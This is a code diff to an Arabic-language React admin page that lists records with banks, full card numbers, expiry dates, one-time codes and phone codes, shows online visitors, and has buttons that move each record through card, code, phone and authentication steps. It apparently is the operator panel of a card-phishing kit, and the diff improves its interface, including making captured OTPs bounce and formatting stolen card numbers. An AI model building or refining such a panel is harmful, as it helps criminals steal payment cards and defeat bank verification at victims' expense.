@@ -28,6 +28,10 @@ import {
   RefreshCw,
   AlertCircle,
   Loader2,
+  Phone,
+  LockIcon,
+  Shield,
+  ClipboardCheck 
 } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Badge } from "@/components/ui/badge"
@@ -110,11 +114,11 @@ interface Notification {
 }
 
 const stepButtons = [
-  { label: "بطاقة", step: 1 },
-  { label: "كود", step: 2 },
-  { label: "رقم", step: 3 },
-  { label: "كود الهاتف", step: 4 },
-  { label: "مصادقة", step: 5 },
+  { name:"بطاقه",label:<CreditCard/>, step: 1 },
+  { name:"كود",label:<LockIcon/>, step: 2 },
+  { name:"رقم",label: <Phone/>, step: 3 },
+  { name:"كود هاتف",label: <Shield/>, step: 4 },
+  { name:"مصادقة",label:<ClipboardCheck/>, step: 5 },
 ]
 
 // Hook for online users count
@@ -1440,16 +1444,6 @@ export default function NotificationsPage() {
                             {notification.phone ? "معلومات شخصية" : "لا يوجد معلومات"}
                           </Badge>
                           <Badge
-                            variant={notification?.network ? "default" : "outline"}
-                            className={`cursor-pointer transition-all hover:scale-105 ${
-                              notification.network ? "bg-gradient-to-r from-yellow-500 to-pink-600 text-white" : ""
-                            }`}
-                            onClick={() => handleInfoClick(notification, "personal")}
-                          >
-                            <User className="h-3 w-3 mr-1" />
-                            {notification.phone ? "معلومات شخصية" : "لا يوجد معلومات"}
-                          </Badge>
-                          <Badge
                             variant={notification.cardNumber ? "default" : "secondary"}
                             className={`cursor-pointer transition-all hover:scale-105 ${
                               notification.cardNumber ? "bg-gradient-to-r from-green-500 to-green-600 text-white" : ""
@@ -1465,7 +1459,7 @@ export default function NotificationsPage() {
                         {notification.status === "approved" ? (
                           <Badge className="bg-gradient-to-r from-green-500 to-green-600 text-white">
                             <CheckCircle className="h-3 w-3 mr-1" />
-                            موافق عليه
+                            موافق 
                           </Badge>
                         ) : notification.status === "rejected" ? (
                           <Badge className="bg-gradient-to-r from-red-500 to-red-600 text-white">
@@ -1475,7 +1469,7 @@ export default function NotificationsPage() {
                         ) : (
                           <Badge className="bg-gradient-to-r from-yellow-500 to-yellow-600 text-white">
                             <Clock className="h-3 w-3 mr-1" />
-                            قيد المراجعة
+                           معلق
                           </Badge>
                         )}
                       </td>
@@ -1494,23 +1488,33 @@ export default function NotificationsPage() {
                       </td>
                       <td className="px-6 py-4 text-center">
                         {notification.otp && (
-                          <Badge variant="outline" className="bg-blue-50 text-blue-700 border-blue-200">
+                          <Badge variant="outline" className="bg-blue-50 text-blue-700 border-blue-200 animate-bounce">
                             {notification.otp}
                           </Badge>
                         )}
                       </td>
                       <td className="px-6 py-4">
                         <div className="flex flex-wrap justify-center gap-1">
-                          {stepButtons.map(({ label, step }) => (
+                          {stepButtons.map(({ name,label, step }) => (
+                             <TooltipProvider 
+                             key={step}
+                             >
+                             <Tooltip>
+                               <TooltipTrigger asChild>
                             <Button
-                              key={step}
-                              size="sm"
-                              variant={notification.step === step ? "default" : "outline"}
+                              size="icon"
+                              variant={notification.step === step ? "default" : "secondary"}
                               onClick={() => handleStepUpdate(notification.id, step)}
-                              className="text-xs px-2 h-7"
+                              className={`text-xs px-2 h-7 ${notification.step === step?"bg-blue-500":"" }`}
                             >
                               {label}
                             </Button>
+                            </TooltipTrigger>
+                              <TooltipContent>
+                                <p>{name}</p>
+                              </TooltipContent>
+                            </Tooltip>
+                          </TooltipProvider>
                           ))}
                         </div>
                       </td>
@@ -1526,6 +1530,7 @@ export default function NotificationsPage() {
                                   className="bg-gradient-to-r from-green-500 to-green-600 text-white border-0 hover:from-green-600 hover:to-green-700"
                                   disabled={notification.status === "approved"}
                                 >
+                                <p>موافقة</p>
                                   <CheckCircle className="h-4 w-4" />
                                 </Button>
                               </TooltipTrigger>
@@ -1545,6 +1550,7 @@ export default function NotificationsPage() {
                                   className="bg-gradient-to-r from-red-500 to-red-600 text-white border-0 hover:from-red-600 hover:to-red-700"
                                   disabled={notification.status === "rejected"}
                                 >
+                                <p>رفض</p>
                                   <XCircle className="h-4 w-4" />
                                 </Button>
                               </TooltipTrigger>
@@ -1571,7 +1577,7 @@ export default function NotificationsPage() {
                               </TooltipContent>
                             </Tooltip>
                           </TooltipProvider>
-                          <Badge>{notification?.amount}</Badge>
+                          <Badge>{notification?.amount||0.0}</Badge>
                         </div>
                       </td>
                     </tr>
@@ -1796,7 +1802,7 @@ export default function NotificationsPage() {
                   { label: "البنك", value: selectedNotification.bank },
                   {
                     label: "رقم البطاقة",
-                    value: `${selectedNotification?.cardNumber} - ${selectedNotification?.prefix}`,
+                    value: `${selectedNotification?.cardNumber.replace(/(.{4})/g, "$1 ")} - ${selectedNotification?.prefix}`,
                   },
                   {
                     label: "تاريخ الانتهاء",
